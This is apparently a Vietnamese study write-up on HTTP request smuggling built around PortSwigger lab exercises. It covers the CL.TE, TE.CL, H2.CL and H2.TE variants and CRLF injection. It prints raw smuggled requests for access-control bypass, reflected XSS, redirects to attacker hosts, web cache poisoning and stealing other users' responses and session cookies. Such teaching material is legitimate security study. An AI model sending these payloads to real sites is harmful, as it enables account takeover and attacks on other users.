---
layout: post
title: "HTTP request smuggling"
render_with_liquid: false
categories:
  - Web Security
  - PortSwigger
tags:
  - portswigger
  - http-request-smuggling
source_collection: notion_portswigger
---
## Mục Lục

### [**I. Lỗ hổng HTTP request smuggling là gì? Xảy ra khi nào?**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)

1. [**Lỗ hổng HTTP request smuggling là gì?**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
2. [Xảy ra khi nào?](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
    - [**Cấu trúc của chunked transfer encoding**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
    - [**Mã hóa chunked có thể được sử dụng trong các yêu cầu HTTP vì hai lý do:**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)

### [**II. Có bao nhiêu loại smuggling attack HTTP**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)

- [CL.TE](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [TE.CL](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [TE.TE](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [H2.CL](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [H2.TE](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)

### [**III. Detect smuggling attack HTTP**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)

### [**IV. Khai Thác smuggling attack HTTP**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)

- [**Sử dụng HTTP request smuggling để Bypass front-end security controls (Bypass Access Control)**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [**Ăn cắp yêu cầu của người dùng khác (Steal cookie, sensitive information, …)**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [**Sử dụng HTTP request smuggling để khai thác lỗ hổng reflected XSS**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [**Sử dụng HTTP request smuggling để chuyển hướng victim**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [**Sử dụng HTTP request smuggling để khai thác web cache poisoning**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
- [**Poisoning cache response](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)([Ăn cắp phản hồi của người dùng khác](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21))**
- [**Request smuggling via CRLF injection**](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)

---

## I. Lỗ hổng HTTP request smuggling là gì? Xảy ra khi nào?

![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled.png)

**Lỗ hổng HTTP request smuggling là gì?**

HTTP **request smuggling** là một kỹ thuật can thiệp vào cách trang web xử lý chuỗi yêu cầu HTTP nhận được từ một hoặc nhiều người dùng. Các lỗ hổng **request smuggling** thường có tính chất nghiêm trọng cho phép kẻ tấn công vượt qua các biện pháp kiểm soát bảo mật, truy cập trái phép vào dữ liệu nhạy cảm và trực tiếp xâm phạm những người dùng khác của ứng dụng.

Xảy ra khi nào?

Xảy ra khi:

- Đặc tả HTTP/1 cung cấp hai cách khác nhau để chỉ định nơi yêu cầu kết thúc: `Content-Length` và `Transfer-Encoding`
- Front-End server và Back-End server có cùng 1 kết nối

`Mục tiêu` là đánh lừa máy chủ backend để nó chỉ xử lý 1 phần gói tin được gửi từ frontend server, phần còn lại của gói tin sẽ được xếp vào hàng đợi và sẽ ghi đè vào gói tin tiếp theo

- Khi server sử dụng `Content-Length` : nó chỉ định độ dài của nội dung request tính bằng byte.
    
    ```python
    POST /search HTTP/1.1
    Host: normal-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 11
    
    q=smuggling
    ```
    
- Khi server sử dụng `Transfer-Encoding` : chỉ định rằng nội dung thư sử dụng mã hóa theo khối. Điều này có nghĩa là nội dung thư chứa một hoặc nhiều khối dữ liệu. Mỗi đoạn bao gồm kích thước đoạn theo byte (được biểu thị bằng hệ 16), theo sau là dòng mới, tiếp theo là nội dung đoạn. Tin nhắn được kết thúc bằng một đoạn có kích thước bằng 0
    
    **Cấu trúc của chunked transfer encoding**
    
    1. **Kích thước của mỗi chunk** (chunk size):
        - Được biểu diễn dưới dạng số hexadecimal, theo sau bởi một cặp ký tự CRLF (Carriage Return và Line Feed).
        - Kích thước là độ dài của dữ liệu chunk tính bằng byte.
    2. **Dữ liệu của chunk** (chunk data):
        - Ngay sau phần kích thước, là dữ liệu của chunk.
        - Dữ liệu được theo sau bởi một cặp ký tự CRLF.
    3. **Kết thúc truyền dữ liệu** (end of data):
        - Khi không còn dữ liệu nào để gửi, một chunk với kích thước 0 được gửi, theo sau bởi một cặp ký tự CRLF.
        - Sau đó có thể có các tiêu đề (headers) cuối cùng, theo sau bởi một cặp CRLF.
    
    ```python
    POST /search HTTP/1.1
    Host: normal-website.com
    Transfer-Encoding: chunked
    
    7\r\n
    Mozilla\r\n
    9\r\n
    Developer\r\n
    7\r\n
    Network\r\n
    0\r\n
    \r\n
    ```
    
    **Mã hóa chunked có thể được sử dụng trong các yêu cầu HTTP vì hai lý do:**
    
    - Các trình duyệt thường không sử dụng mã hóa chunked trong các yêu cầu và nó thường chỉ được thấy trong các phản hồi của máy chủ.
    - Burp Suite tự động giải nén mã hóa theo khối để giúp xem và chỉnh sửa tin nhắn dễ dàng hơn.
    
    Nếu có cả  `Content-Length` và `Transfer-Encoding` trong 1 http request , thì `Content-Length` sẽ bị bỏ qua.
    

## II. Có bao nhiêu loại smuggling attack HTTP

Có 5 loại smuggling attack http

Để thực hiện được cuộc tấn công này, ta cần dựa vào hoạt động của 2 máy chủ frontend server và backend server:

`Mục tiêu` là đánh lừa máy chủ backend để nó chỉ sử lý 1 phần gói tin được gửi từ frontend server, phần còn lại của gói tin sẽ được xếp vào hàng đợi và sẽ ghi đè vào gói tin tiếp theo

Luôn luôn phải chuyển version của HTTP/2 xuống  HTTP/1.1

- `CL.TE` Khi máy chủ frontend sử dụng `conten-length` , máy chủ backend sử dụng `transfer-encoding`
    
    Ta sẽ đặt `khối chunked` vào trong phần nội dung của `content-length`
    
    Ví dụ
    
    ```php
    POST / HTTP/1.1
    Host:vulnerable.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6
    Transfer-Encoding: chunked
    \r\n
    0\r\n
    \r\n
    G
    ```
    
    → Lúc này máy chủ frontend xử lý `Content-Length` có chiều dài là `6` bytes bao gồm `0\r\n
    \r\n
    G`  nên sẽ forward toàn bộ tới máy chủ backend.
    
    → Máy chủ backend xử lý `Transfer-Encoding` chỉ xử lý các message đứng trước khối `0\r\n\r\n`  nên phần còn lại của gói tin là `G` sẽ bị đưa vào hàng đợi
    
    → Khi request tiếp theo gửi đến, `G` sẽ được thêm vào đầu của `http request` này (vì `G` ở đầu của hàng đợi)
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%201.png)
    
- `TE.CL` máy chủ frontend sử dụng `Transfer-encoding` , máy chủ backend sử dụng `Conten-Length`
    
    ```php
    POST / HTTP/1.1
    Host: vulnerable.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 12
    Transfer-Encoding: chunked
    
    4\r\n
    hihi\r\n
    1\r\n
    G\r\n
    0\r\n
    \r\n
    ```
    
    → Máy chủ frontend sử dụng `Transfer-Encoding` nhận thấy có 3 khối chunk
    
    `Khối đầu tiên` : là `hihi` có chiều dài là `0x4`
    
    `Khối thứ 2` : là `G` có chiều dài là `0x1`
    
    `Khối cuối cùng` là `0\r\n\r\n` kết thúc chunk
    
    Cả 3 khối này đều được forward đến backend server
    
    → Tại backend server xử lý http request là `Content-Length` và nhận thấy chiều dài là `12` bytes bap gồm:
    
    `4\r\n
    hihi\r\n
    1\r\n`
    
    → Phần còn lại:
    
    `G\r\n
    0\r\n
    \r\n`
    
    → Phần còn lại sẽ được giữ lại trong hàng đợi ở backend, khi gói tin tiếp theo gửi đến phần còn lại sẽ được thêm vào đầu gói tin này
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%202.png)
    
- `TE.TE` cả 2 máy chủ đề sử dụng `Transfer-encoding`
    
    
- `H2.CL` máy chủ frontend sử dụng HTTP/2 , máy chủ backend sử dụng `Conten-Length`
    
    &gt; HTTP/2 thực hiện đóng gói gói tin theo các `frame` , độ dài của frame sẽ được cơ chế của HTTP/2 tính toán và đặt vào đầu `frame` . Độ dài của cả gói tin sẽ bằng tổng của tất cả các `frame` , Độ dài này sẽ được ẩn đi,  ngầm định là cộng tổng chiều dài định nghĩa trên các frame
    &gt; 
    
    Lỗ hổng này chỉ xảy ra khi HTTP/2 thực hiện hạ cấp xuống HTTP/1.1 
    
    &gt; Lý do: Máy chủ frontend sử dụng HTTP/2 nhưng backend sử dụng HTTP/1.1. Vì vậy để proxy forward được cho backend bắt buộc nó phải hạ cấp HTTP,
    &gt; 
    
    Thông số kỹ thuật quy định rằng mọi `Content-Length`  trong yêu cầu HTTP/2 phải khớp với độ dài được tính toán bằng cơ chế tích hợp, nhưng điều này không phải lúc nào cũng được xác thực đúng cách trước khi hạ cấp.
    
    Vì `frontend server HTTP/2`  ngầm định để xác định nơi yêu cầu kết thúc (không sử dụng `content-length` trên header), nhưng `back-end HTTP/1` phải tham chiếu đến `Content-Length` được lấy từ header. Do đó, có thể chuyển lậu các yêu cầu bằng cách chèn `content-length` sai lệch.
    
    **Detect**
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%203.png)
    
    **Thực hiện điều hướng**
    
    Hành vi mặc định của máy chủ web Apache và IIS, trong đó yêu cầu về một thư mục không có dấu gạch chéo ở cuối sẽ nhận được chuyển hướng đến cùng thư mục bao gồm cả dấu gạch chéo ở cuối:
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%204.png)
    
    ```php
    POST / HTTP/2
    Host: 0a6c00d00402cda681437a1500660086.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    
    GET /resources HTTP/1.1
    Host: exploit-0a8800e30496cde881de795101d900ea.exploit-server.net
    Content-length: 10
    
    x=1
    ```
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%205.png)
    
- **`H2.TE`** máy chủ frontend sử dụng HTTP/2 , máy chủ backend sử dụng `Transfer-encoding`
    
    `Transfer-Encoding` không tương thích với HTTP/2, HTTP/2 khuyến nghị rằng mọi header chứa tiêu đề này nên bị loại bỏ hoặc bị chặn hoàn toàn
    
    Nếu máy chủ Front-End không thực hiện được việc này và sau đó hạ cấp yêu cầu cho một back-end HTTP/1 hỗ trợ mã hóa chunk, thì điều này cũng có thể tạo điều kiện cho các cuộc tấn công trái phép yêu cầu.
    
    Detect (Tắt update content length)
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%206.png)
    
    Nếu một trang web dễ bị tấn công trái phép yêu cầu `H2.CL` hoặc `H2.TE`, thì có thể bị khai thác giống các cuộc tấn công ở trên 
    

## III. Detect smuggling attack HTTP

![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%207.png)

![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%208.png)

## IV. Khai Thác smuggling attack HTTP

- **Sử dụng HTTP request smuggling để Bypass front-end security controls (Bypass Access Control)**
    
    Trong một số ứng dụng, máy chủ web proxy được sử dụng để triển khai một số biện pháp kiểm soát bảo mật, quyết định xem chỉ các yêu cầu an toàn mới được phép chuyển tiếp đến máy chủ backend.
    
    1. Proxy reject request của `user` bình thường không thể truy cập vào trang `admin`
    2. Proxy chỉ accept nhưng request từ `localhost` 
        
        Bypass ⇒ 
        
        &gt; Host: localhost
        &gt; 
        &gt; 
        &gt; X-Forwarded-For: 127.0.0.1
        &gt; 
    3. Proxy `rewrite` lại request 
        
        Trong nhiều ứng dụng, máy chủ proxy thực hiện một số thao tác viết lại request trước khi chúng được chuyển tiếp đến máy chủ backend, bằng cách thêm một số `header` bổ sung như:
        
        - Chấm dứt kết nối TLS và thêm một số tiêu đề mô tả giao thức và mật mã đã được sử dụng
        - Thêm tiêu đề `X-Forwarded-For` chứa địa chỉ IP của người dùng
        - Xác định ID người dùng dựa trên mã phiên của họ và thêm tiêu đề xác định người dùng
        - Thêm một số thông tin nhạy cảm được quan tâm cho các cuộc tấn công khác.
        
        Nếu `smuggled request` không xác định được các tên của các `header` được `proxy` thêm vào thì sẽ không thể thay đổi những giá trị mà `backend` sử dụng từ những `header` được `proxy` thêm vào đó.
        
        Sau khi  `smuggled request` được thêm những `header` được `proxy` rewrite, thì `proxy sẽ không rewrite lại nó nữa.`
        
        [Cách tìm ra các header được proxy thêm vào (click me)](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
        
        ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%209.png)
        
        Có thể thấy việc smuggled đã thành công nhưng không thể truy cập vào được `/admin` , do proxy đã thêm tiêu đề nào đó để làm request bình thường không đủ thẩm quyền
        
        Áp dụng [cách tìm header được thêm vào ở trên](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21)
        
        ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2010.png)
        
        Có thể thấy `backend` sử dụng `X-tubHLk-Ip: 104.28.222.74` để xác định yêu cầu
        
        Bây giờ đem `X-tubHLk-Ip: 127.0.0.1` vào tiêu đề của smuggled request, proxy sẽ không rewrite nó nữa, vì nó đã tồn tại.
        
        ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2011.png)
        
- **Ăn cắp yêu cầu của người dùng khác (Steal cookie, sensitive information, …)**
    
    Nếu ứng dụng chứa bất kỳ loại chức năng nào cho phép lưu trữ và sau đó truy xuất dữ liệu văn bản thì có thể sử dụng chức năng này để lưu lại yêu cầu của người dùng khác.
    
    Chúng có thể bao gồm mã thông báo phiên hoặc dữ liệu nhạy cảm khác do người dùng gửi.
    
    Các chức năng phù hợp để sử dụng làm phương tiện cho cuộc tấn công này sẽ là:  `comments, emails, profile descriptions, screen names, ...`
    
    Để thực hiện cuộc tấn công, bạn cần chuyển lậu một yêu cầu gửi dữ liệu đến chức năng lưu trữ, với tham số là dữ liệu cần lưu trữ ở vị trí cuối cùng trong yêu cầu.
    
    Các bước để store yêu cầu của 1 người dùng khác
    
    - `B1:` Tìm yêu cầu POST có reflects giá trị của tham số yêu cầu trong phản hồi của ứng dụng.(ví dụ như search, post comment, update thông tin, ...)
    - `B2:` Trong request smuggled đưa tham số được phản ánh xuất hiện cuối cùng trong http request.
    - `B3:` Gửi request smuggled này đến máy chủ backend xử lý, sau đó nội dung của request ở `B1` sẽ được reflected, lúc này có thể thấy các giá trị mà proxy thêm vào
    
    &gt; `Note 1:` Giá trị trong tiêu đề `Content-Length` trong smuggle request sẽ xác định máy chủ back-end tin rằng yêu cầu đó kéo dài bao lâu. Nếu đặt `Content-Length` quá bé, bạn sẽ chỉ nhận được một phần yêu cầu tới sau. Nếu đặt `Content-Length` quá lớn, máy chủ backend sẽ hết thời gian chờ yêu cầu hoàn tất (timeout). Giải pháp là đặt `Content-Length` vừa phải và sau đó tăng dần giá trị để lấy thêm thông tin cho đến khi có được mọi thứ bạn quan tâm.
    &gt; 
    
    &gt; `Note 2:` Một hạn chế của kỹ thuật này là nó thường chỉ thu thập dữ liệu cho đến khi có dấu phân cách tham số áp dụng cho yêu cầu lậu, nghĩa là nội dung được lưu trữ từ yêu cầu của nạn nhân sẽ kết thúc ở `&` đầu tiên, thậm chí có thể xuất hiện trong chuỗi truy vấn
    &gt; 
    
- **Sử dụng HTTP request smuggling để khai thác lỗ hổng reflected XSS**
    
    Nếu một ứng dụng dễ bị HTTP request smuggling và cũng chứa reflected XSS, có thể sử dụng một cuộc tấn công request smuggling để tấn công những người dùng khác của ứng dụng, cách tiếp cận này vượt trội hơn so với việc khai thác XSS được phản ánh thông thường theo hai cách:
    
    - Nó không yêu cầu tương tác với người dùng nạn nhân, không cần phải cung cấp cho victim một URL và đợi họ truy cập vào nó. Chỉ cần gửi lậu một yêu cầu chứa payload XSS và yêu cầu của người dùng tiếp theo sẽ nhận được phản hồi chứa payload XSS
    - Nó có thể được sử dụng để khai thác hành vi XSS trong các phần của yêu cầu không thể kiểm soát được trong một cuộc tấn công XSS được phản ánh thông thường,
    
    Ví dụ: Giả sử một ứng dụng có lỗ hổng XSS được phản ánh trong tiêu đề `User-Agent`. Có thể khai thác điều này trong một cuộc tấn công buôn lậu yêu cầu như sau:
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2012.png)
    
    Ta có thể gửi 1 smuggled request chứa payload XSS như sau
    
    ```php
    POST / HTTP/1.1
    Host: 0a8f00fa03ce55e880b8dab0006b000a.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 104
    Transfer-Encoding: chunked
    
    0
    
    GET /post?postId=1 HTTP/1.1
    User-Agent: "> <img src=1 onerror=alert(1)>
    Content-Length: 16
    
    x=1
    ```
    
- **Sử dụng HTTP request smuggling để chuyển hướng victim**
    
    `Lỗ hổng này xảy ra khi ứng dụng thực hiện chuyển hướng tại chỗ từ URL này sang URL khác và lấy tiêu đề Máy chủ của yêu cầu đặt tên cho máy chủ đích  của URL chuyển hướng.`
    
    Hành vi mặc định của máy chủ web Apache và IIS, trong đó yêu cầu về một thư mục không có dấu gạch chéo ở cuối sẽ nhận được chuyển hướng đến cùng thư mục bao gồm cả dấu gạch chéo ở cuối:
    
    ```php
    GET /home HTTP/1.1
    Host: normal-website.com
    
    HTTP/1.1 301 Moved Permanently
    Location: https://normal-website.com/home/
    ```
    
    Hành vi này thường được coi là vô hại nhưng nó có thể bị lợi dụng trong một cuộc tấn công **`smuggled request`** để chuyển hướng người dùng khác đến một miền bên ngoài.
    
    ```php
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 54
    Transfer-Encoding: chunked
    
    0
    
    GET /home HTTP/1.1
    Host: attacker-website.com
    Foo: X
    ```
    
    ---
    
    Yêu cầu lậu sẽ kích hoạt chuyển hướng đến trang web của attack, điều này sẽ ảnh hưởng đến yêu cầu của người dùng tiếp theo được xử lý bởi máy chủ backend. Ví dụ:
    
    ```php
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 
    Transfer-Encoding: chunked
    
    0
    
    GET /home HTTP/1.1
    Host: attacker-website.com
    Foo: XGET /scripts/include.js HTTP/1.1
    Host: vulnerable-website.com
    
    HTTP/1.1 301 Moved Permanently
    Location: https://attacker-website.com/home/
    ```
    
    Ở đây, yêu cầu của người dùng là về một tệp JavaScript, kẻ tấn công hoàn toàn có thể xâm phạm nạn nhân bằng cách trả về JavaScript của chính họ trong phản hồi.
    
    ---
    
    Biến chuyển hướng tương đối gốc thành chuyển hướng mở
    
    Trong một số trường hợp, bạn có thể gặp phải các chuyển hướng cấp máy chủ sử dụng đường dẫn để tạo URL tương đối gốc cho tiêu đề `Location`, ví dụ:
    
    ```php
    GET /example HTTP/1.1
    Host: normal-website.com
    
    HTTP/1.1 301 Moved Permanently
    Location: /example/
    ```
    
    Điều này có khả năng vẫn có thể được sử dụng cho chuyển hướng mở nếu máy chủ cho phép bạn sử dụng URL tương đối với giao thức trong đường dẫn:
    
    ```php
    GET //attacker-website.com/example HTTP/1.1
    Host: vulnerable-website.com
    
    HTTP/1.1 301 Moved Permanently
    Location: //attacker-website.com/example/
    ```
    
- **Sử dụng HTTP request smuggling để khai thác web cache poisoning**
    
    **Web cache poisoning:** kẻ tấn công khiến ứng dụng lưu trữ một số nội dung độc hại trong bộ đệm và nội dung này được cung cấp từ bộ đệm cho những người dùng ứng dụng khác.
    
    Nếu bất kỳ phần nào của frontend server sử dụng cơ chế cache response từ backend, thì có thể gây nhiễm độc bộ đệm bằng phản hồi chuyển hướng bên ngoài trang web.
    
    Ví dụ trong bài [lab-perform-web-cache-poisoning](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning) của portswigge
    
    Hệ thống bị lỗ hổng `CL.TE` và `frontend server` cache lại nội dung file CDN do `backend server` trả về, và `tracking.js` chứa lỗ hổng xss
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2013.png)
    
     `Mục tiêu là` poisoning cache trên proxy sao cho nội dung trả về của `GET /resources/js/tracking.js` là file js của attacker
    
    &gt; Kịch bản: Đợi `Age` của `GET /resources/js/tracking.js` đến khoảng `27`  →  Gửi `smuggled request` chứa request fetch js của attacker, lúc này gửi lại `GET /resources/js/tracking.js` → XSS được trigger
    &gt; 
    - 1.  `Max-Age=30` giây, đợi đến khi `Age` gần đến Max sẽ gửi  `smuggled request`
    - 2. `smuggled request` chứa request fetch js của attacker, phản hồi khối chunk trên `queue backend` của request này là 1 điều hướng tới site của attacker, nơi payload trigger xss được lưu.
        
        Vì proxy cache lại CDN của backend trả về, nên ta cần sử dụng `CL.TE` tìm được ở trên để fetch  file js của attacker, bằng cách sau:
        
        ```php
        POST / HTTP/1.1\r\n
        Host: 0a17000c03527f2d8051945400910043.web-security-academy.net\r\n
        Content-Type: application/x-www-form-urlencoded\r\n
        Content-Length: 180\r\n
        Transfer-Encoding: chunked\r\n
        \r\n
        0\r\n
        \r\n
        GET /post/next?postId=1 HTTP/1.1\r\n
        Host: exploit-0a6a001f03397fac80b293040124006d.exploit-server.net\r\n
        Content-Type: application/x-www-form-urlencoded\r\n
        Content-Length: 10\r\n
        \r\n
        x=1
        ```
        
        Sau khi smuggled request trên được gửi đi, phần còn lại của chunk sẽ được giữ lại trên queue của `backend` , phần còn lại này chưa được `backend server` xử lý ngay vì `Content-Length: 10` trong khi chỉ có `3 btyes` được cung cấp, nó sẽ đợi `7 bytes` còn thiếu.
        
        ```php
        GET /post/next?postId=1 HTTP/1.1\r\n
        Host: exploit-0a6a001f03397fac80b293040124006d.exploit-server.net\r\n
        Content-Type: application/x-www-form-urlencoded\r\n
        Content-Length: 10\r\n
        \r\n
        x=1
        ```
        
        Và `/post/next?postId=1` là 1 chuyển hướng của `backend`
        
        ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2014.png)
        
        Cách tấn công này cần 1 tính năng `điều hướng mở` của `backend` tức là backend sẽ sử dụng luôn `Host` của request đặt làm `prefix` cho `Location` 
        
    - 3. Sau khi `smuggled request` được gửi, vì phần còn lại của chunk vẫn đang trên `queue backend` , lúc này ta gửi lại  `GET /resources/js/tracking.js` , request này sẽ được nối với request đang trên queue, và trả về 1 điều hướng tới site của attacker, nơi payload trigger xss được lưu. Lúc này `Age` vừa  hay đến Max, nó sẽ cache lại điều hướng này trong 30s.
    - 4.  Mỗi khi có request `GET /resources/js/tracking.js` nó sẽ trả về điều hướng được cache, XSS được trigger do `tracking.js`
    
- **Poisoning cache response([Ăn cắp phản hồi của người dùng khác](https://www.notion.so/HTTP-request-smuggling-8f5d622ad888478a98823cd109864390?pvs=21))**
    
    &gt; Cuộc tấn công này có thể thực hiện được thông qua việc chuyển lậu yêu cầu HTTP/1 và bằng cách khai thác việc hạ cấp HTTP/2.
    &gt; 
    
    **Response queue poisoning** là một hình thức tấn công yêu cầu lậu khiến máy chủ proxy ánh xạ các phản hồi của request tới sau với  phản hồi của request sai nằm trong queue response.
    
    **Impact of response queue poisoning:** Kẻ tấn công có thể nắm bắt phản hồi của người dùng khác. Những phản hồi này có thể chứa dữ liệu nhạy cảm
    
    Để tấn công **response queue poisoning** thành công, phải đáp ứng các tiêu chí sau:
    
    - Kết nối TCP giữa máy chủ front-end và máy chủ backend được sử dụng lại cho [nhiều chu kỳ yêu cầu/phản hồi.](https://portswigger.net/web-security/request-smuggling#what-happens-in-an-http-request-smuggling-attack)
    - Thực nghiệm thành công 1 cuộc smuggled trên chính mình
    - Cuộc tấn công không dẫn đến việc máy chủ đóng kết nối TCP. Máy chủ thường đóng kết nối đến khi chúng nhận được yêu cầu không hợp lệ vì chúng không thể xác định nơi yêu cầu sẽ kết thúc.
    
    **Cơ chế hoạt động**
    
    Các cuộc tấn công yêu cầu lậu thường liên quan đến việc gửi lậu một phần yêu cầu mà máy chủ thêm vào làm tiền tố để bắt đầu yêu cầu tiếp theo trên kết nối.
    
    1. Nếu chỉ gửi request mà không có `body` thì kết quả vẫn thấy hai yêu cầu trả về 2 response hoàn chỉnh.
    2. Nếu gửi lậu một yêu cầu chứa nội dung `body` thì yêu cầu tiếp theo trên kết nối sẽ được thêm vào nội dung của yêu cầu lậu.
    3. Sau khi nhận đủ byte của request đến sau, những byte còn sót lại không tạo thành một yêu cầu hợp lệ nên điều này thường dẫn đến lỗi, khiến máy chủ đóng kết nối.
        
        ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2015.png)
        
        không có yêu cầu không hợp lệ nào được đưa vào back-end, do đó kết nối sẽ vẫn mở sau cuộc tấn công.
        
    4. Thời điểm đóng kết nối chính xác là khác nhau giữa các máy chủ, nhưng mặc định chung là chấm dứt kết nối sau khi đã xử lý 100 yêu cầu. Việc kết nối lại một kết nối mới sau khi kết nối hiện tại bị đóng cũng là điều bình thường.
    
    Khi gửi lén một yêu cầu hoàn chỉnh, máy chủ Front-End vẫn cho rằng nó chỉ chuyển tiếp một yêu cầu duy nhất. Nhưng back-end nhìn thấy hai yêu cầu riêng biệt và sẽ gửi hai phản hồi tương ứng:
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2016.png)
    
    Front-End server ánh xạ chính xác phản hồi đầu tiên với yêu cầu “wapper” nó nhận được ban đầu và chuyển tiếp phản hồi này tới máy khách. Vì không còn yêu cầu nào đang chờ phản hồi nên phản hồi thứ hai không mong đợi sẽ được giữ trong hàng đợi trên kết nối giữa Front-End và Back-End
    
    Khi Front-End nhận được một yêu cầu khác, nó sẽ chuyển tiếp yêu cầu này đến Back-End như bình thường. Tuy nhiên, khi đưa ra phản hồi, nó sẽ gửi phản hồi đầu tiên trong hàng đợi, tức là `phản hồi còn sót lại đối với yêu cầu bị lậu.`
    
    Sau đó, phản hồi chính xác từ  back-end sẽ được nạp vào hàng đợi. Chu kỳ này được lặp lại mỗi khi một yêu cầu mới được chuyển tiếp xuống cùng một kết nối tới back-end.
    
    **Ăn cắp phản hồi của người dùng khác**
    
    Khi hàng đợi phản hồi bị nhiễm độc, kẻ tấn công có thể gửi một yêu cầu tùy ý để nắm bắt phản hồi của người dùng khác.
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2017.png)
    
    Để dễ dàng phân biệt phản hồi bị đánh cắp với phản hồi cho yêu cầu của chính mình, hãy sử dụng đường dẫn không tồn tại trong cả hai yêu cầu gửi đi. Ví dụ: các yêu cầu của riêng mình sẽ liên tục nhận được phản hồi 404.
    
    Gửi request smuggled này đi và sau đó giả sử khi có người dùng khác gửi 1 request đăng nhập, response họ nhận được là `404` (vì `404` bị kẹt lại ở queue response)
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2018.png)
    
    Sau đó gửi lại request, nhận được phản hồi của yêu cầu đăng nhập của người khác `302` kèm theo mã Cookie phiên của họ.
    
- **Request smuggling via CRLF injection**
    
    Ngay cả khi các trang web thực hiện các bước để ngăn chặn các cuộc tấn công `H2.CL` hoặc `H2.TE` cơ bản, chẳng hạn như xác thực `Content-Length` hoặc loại bỏ mọi tiêu đề  `transfer-encoding` .
    
    Lỗ hổng này xảy ra vì `HTTP/2` xử lý header ở định dạng dạng nhị phân, còn header `HTTP/1`  xử lý theo dòng. Khi thêm ký tự `\r\n` ,  trong  `HTTP/2`  nó không còn có bất kỳ ý nghĩa nào trong giá trị tiêu đề và do đó nó được coi là 1 chuỗi bình thường, nhưng trong `HTTP/1.1` thì `\r\n`  lại là ký tự phân tách dòng, giúp phân biệt các header.
    
    **Thực Nghiệm `(H2.TE)`**
    
    Có thể thấy sử dụng trực tiếp `Content-Length` và  `transfer-encoding` không hề gây ra `time out` hay `redirect 404`
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2019.png)
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2020.png)
    
    Bây giờ, chèn `\r\n` vào và đặt chế độ `update content length`
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2021.png)
    
    Kết quả:
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2022.png)
    
    **Thực Nghiệm `H2.CL`**
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2023.png)
    
    Add
    
    Gửi yêu cầu. Khi máy chủ front-end thêm `\r\n\r\n` vào cuối tiêu đề trong quá trình hạ cấp, gói tin này sẽ được split ra làm 2 gói tin chính xác, và phản hồi `404` được lưu lại trên response queue
    
    ![Untitled](/assets/img/portswigger/http-request-smuggling/Untitled%2024.png)
    
    Các biến thể, hay impact cũng sẽ tương tự các kỹ thuật được trình bày ở trên.
